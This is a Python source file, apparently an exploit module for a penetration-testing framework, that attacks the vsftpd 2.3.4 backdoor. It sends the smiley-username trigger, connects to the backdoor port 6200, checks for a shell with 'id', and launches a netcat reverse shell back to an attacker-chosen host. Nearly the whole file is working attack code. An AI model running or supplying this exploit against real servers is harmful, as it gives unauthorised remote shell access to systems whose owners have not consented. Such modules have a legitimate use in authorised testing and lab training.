from msf.lib.exploit import Exploit, Revshell
import re
import socket


class Vsftpd(Exploit):

    def __init__(self):
        super().__init__('vsftpd', 'vsftpd v2.3.4 exploit')

    def check(self, target, port=21) -> bool:
        conn = Exploit.init_tcp_conn(target, port)
        if not conn:
            return False
        print('Checking service version.')
        banner = Vsftpd.get_banner(conn)
        # check to make sure this is indeed running vsftpd v2.3.4
        if banner.lower() != '220 (vsftpd 2.3.4)':
            print('Target does not appear to be vulnerable.')
        else:
            print('Target appears to be vulnerable!')

    def exploit(self, target, port=21, revshell_ip=None, revshell_port=None):
        payload = Revshell.build_generic_nc_payload(revshell_ip, revshell_port)
        conn = Exploit.init_tcp_conn(target, port)
        if not conn:
            return False
        banner = Exploit.get_banner(conn)
        if not Vsftpd.open_backdoor(conn):
            print('Error, unable to open backdoor. Perhaps target is not exploitable?')
            return False
        backdoor_conn = Exploit.init_tcp_conn(target, 6200)
        if not backdoor_conn:
            return False
        # start revshell thread
        revshell = Revshell(revshell_ip, revshell_port)
        revshell.start()
        if Vsftpd.inject_payload(backdoor_conn, payload):
            print('Exploit successful!')
            success = True
        else:
            print('ERROR: Did not gain shell. Exploit failed.')
            success = False
        # clean up
        print('Closing connections to server.')
        backdoor_conn.close()
        conn.close()
        print('Exploit complete.')
        if success:
            return revshell
        revshell.terminate()
        return success

    @staticmethod
    def open_backdoor(conn: socket.socket) -> bool:
        """
        Send the parameters to the FTP server that will open the backdoor port.
        :param conn: socket object connected to backdoor
        :return: boolean indicating success or failure
        """
        print('Opening backdoor.')
        sent_bytes = conn.send('USER abc123:)\r\n'.encode())
        print(sent_bytes)
        response = conn.recv(1024)
        passwd_response = response.decode().strip()
        print(passwd_response)
        passwd_response_code = int(passwd_response.split()[0])
        print(passwd_response_code)
        if passwd_response_code != 331:
            return False
        sent_bytes = conn.send('PASS \r\n'.encode())
        print(sent_bytes)
        return True

    @staticmethod
    def inject_payload(conn: socket.socket, payload) -> bool:
        """
        Inject a payload into the backdoor connection.
        :param conn: socket object connected to backdoor
        :param payload: payload to inject (usually a reverse shell)
        :return: boolean indicating success or failure
        """
        print('Injecting payload via backdoor.')
        # verify that we have a shell and grab the user ID
        sent_bytes = conn.send('id\n'.encode())
        response = conn.recv(1024)
        uid_data = response.decode().strip()
        if re.search(r'^uid=', uid_data):
            uid = uid_data.split('(')[1].split(')')[0]
            print('Got shell as user {}!'.format(uid))
            # send a simple reverse shell from the exploited server to the attacking host
            print('Injecting and running payload.')
            sent_bytes = conn.send('nohup {} >/dev/null 2>&1\n'.format(payload).encode())
            return True
        else:
            print(uid_data)
            return False